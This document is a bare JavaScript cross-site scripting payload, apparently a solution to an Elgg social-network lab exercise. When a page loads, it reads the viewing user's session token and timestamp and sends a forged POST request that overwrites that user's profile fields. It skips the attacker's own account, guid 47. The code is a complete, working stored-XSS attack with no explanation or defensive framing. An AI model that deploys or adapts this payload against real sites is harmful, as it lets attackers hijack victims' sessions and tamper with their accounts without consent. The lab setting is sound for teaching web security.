<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var id = elgg.session.user.guid;
	//Construct the content of your url.
        var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN

	// for changing briefdescription = 1605098 and all other fields with random values and accesslevel = loged in users	
	var content=token + ts + "&description=A&accesslevel%5Bdescription%5D=1&briefdescription=1605098&accesslevel%5Bbriefdescription%5D=1&location=B&accesslevel%5Blocation%5D=1&interests=C&accesslevel%5Binterests%5D=1&skills=D&accesslevel%5Bskills%5D=1&contactemail=a@gmail.com&accesslevel%5Bcontactemail%5D=1&phone=12345&accesslevel%5Bphone%5D=1&mobile=1212122&accesslevel%5Bmobile%5D=1&website=i.me&accesslevel%5Bwebsite%5D=1&twitter=E&accesslevel%5Btwitter%5D=1&guid=" + id; //FILL IN
	

//for changing less no of field field
//&briefdescription=1605098&accesslevel%5Bbriefdescription%5D=1&location=AAA&accesslevel%5Blocation%5D=1&guid="
//token + ts + &briefdescription=1605098................&guid=

//actual request body example got from the "Edit and Resend" option.  
//__elgg_token=qW1OmgBTJ6wMkM2JZArh8A&__elgg_ts=1624472575&briefdescription=16050989999992&guid=47
	

	if(id != 47) // skip if the id is Sammy's
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>
